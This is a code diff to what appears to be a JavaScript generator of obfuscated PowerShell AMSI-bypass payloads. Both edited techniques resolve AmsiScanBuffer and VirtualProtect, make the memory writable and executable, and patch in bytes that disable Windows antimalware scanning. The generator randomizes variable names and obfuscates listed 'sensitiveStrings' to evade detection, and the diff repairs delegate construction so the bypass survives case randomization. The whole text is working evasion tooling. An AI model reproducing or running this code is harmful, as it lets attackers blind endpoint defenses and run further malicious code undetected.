@@ -302,15 +302,19 @@ TechniqueRegistry.register({
     const vK32 = randomVarName();
     const vVpAddr = randomVarName();
     const vVpDel = randomVarName();
+    const vRef = randomVarName();
 
     // VirtualProtect is NOT on UnsafeNativeMethods — resolve it via GetProcAddress from kernel32
+    // Build delegate type via MakeGenericType to avoid [Func[...[UInt32].MakeByRefType()...]]
+    // inline syntax which breaks under case randomization
     const raw =
       genNativeResolver(vSysDll, vUnsafe, vLoadLib, vGetProc) +
       `$${vLib}=$${vLoadLib}.Invoke($null,@('amsi.dll'));` +
       `$${vAddr}=$${vGetProc}.Invoke($null,@($${vLib},'AmsiScanBuffer'));` +
       `$${vK32}=$${vLoadLib}.Invoke($null,@('kernel32.dll'));` +
       `$${vVpAddr}=$${vGetProc}.Invoke($null,@($${vK32},'VirtualProtect'));` +
-      `$${vVpDel}=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($${vVpAddr},[Func[IntPtr,UInt32,UInt32,[UInt32].MakeByRefType(),[Bool]]]);` +
+      `$${vRef}=[UInt32].MakeByRefType();` +
+      `$${vVpDel}=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($${vVpAddr},([type]'System.Func\`5').MakeGenericType([IntPtr],[UInt32],[UInt32],$${vRef},[Bool]));` +
       `$${vOld}=[uint32]0;` +
       `$${vVpDel}.Invoke($${vAddr},6,0x40,[ref]$${vOld});` +
       `$${vPatch}=[byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);` +
@@ -322,7 +326,7 @@ TechniqueRegistry.register({
       variables: [
         `$${vSysDll}`, `$${vUnsafe}`, `$${vLoadLib}`, `$${vGetProc}`,
         `$${vLib}`, `$${vAddr}`, `$${vOld}`, `$${vPatch}`,
-        `$${vK32}`, `$${vVpAddr}`, `$${vVpDel}`
+        `$${vK32}`, `$${vVpAddr}`, `$${vVpDel}`, `$${vRef}`
       ],
       sensitiveStrings: ['AmsiScanBuffer', 'amsi.dll', 'VirtualProtect', 'UnsafeNativeMethods', 'kernel32.dll']
     });
@@ -367,15 +371,19 @@ TechniqueRegistry.register({
     const vK32 = randomVarName();
     const vVpAddr = randomVarName();
     const vVpDel = randomVarName();
+    const vRef = randomVarName();
 
     // VirtualProtect resolved via GetProcAddress from kernel32, not UnsafeNativeMethods
+    // Build delegate type via MakeGenericType to avoid [Func[...[UInt32].MakeByRefType()...]]
+    // inline syntax which breaks under case randomization
     const raw =
       genNativeResolver(vSysDll, vUnsafe, vLoadLib, vGetProc) +
       `$${vLib}=$${vLoadLib}.Invoke($null,@('amsi.dll'));` +
       `$${vAddr}=$${vGetProc}.Invoke($null,@($${vLib},'AmsiScanBuffer'));` +
       `$${vK32}=$${vLoadLib}.Invoke($null,@('kernel32.dll'));` +
       `$${vVpAddr}=$${vGetProc}.Invoke($null,@($${vK32},'VirtualProtect'));` +
-      `$${vVpDel}=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($${vVpAddr},[Func[IntPtr,UInt32,UInt32,[UInt32].MakeByRefType(),[Bool]]]);` +
+      `$${vRef}=[UInt32].MakeByRefType();` +
+      `$${vVpDel}=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($${vVpAddr},([type]'System.Func\`5').MakeGenericType([IntPtr],[UInt32],[UInt32],$${vRef},[Bool]));` +
       `$${vOld}=[uint32]0;` +
       `$${vVpDel}.Invoke($${vAddr},6,0x40,[ref]$${vOld});` +
       `$${vPatch}=[byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);` +
@@ -387,7 +395,7 @@ TechniqueRegistry.register({
       variables: [
         `$${vSysDll}`, `$${vUnsafe}`, `$${vLoadLib}`, `$${vGetProc}`,
         `$${vLib}`, `$${vAddr}`, `$${vOld}`, `$${vPatch}`,
-        `$${vK32}`, `$${vVpAddr}`, `$${vVpDel}`
+        `$${vK32}`, `$${vVpAddr}`, `$${vVpDel}`, `$${vRef}`
       ],
       sensitiveStrings: ['AmsiScanBuffer', 'amsi.dll', 'VirtualProtect', 'UnsafeNativeMethods', 'kernel32.dll']
     });
@@ -915,7 +923,8 @@ function generate(techniqueName = null) {
 
   let payload = technique.generate();
   payload = ObfuscationPipeline.run(payload);
-  return payload.raw;
+  const stubComment = `# Stub: ${technique.name}\n`;
+  return stubComment + payload.raw;
 }
 
 function generateEncoded(techniqueName = null) {
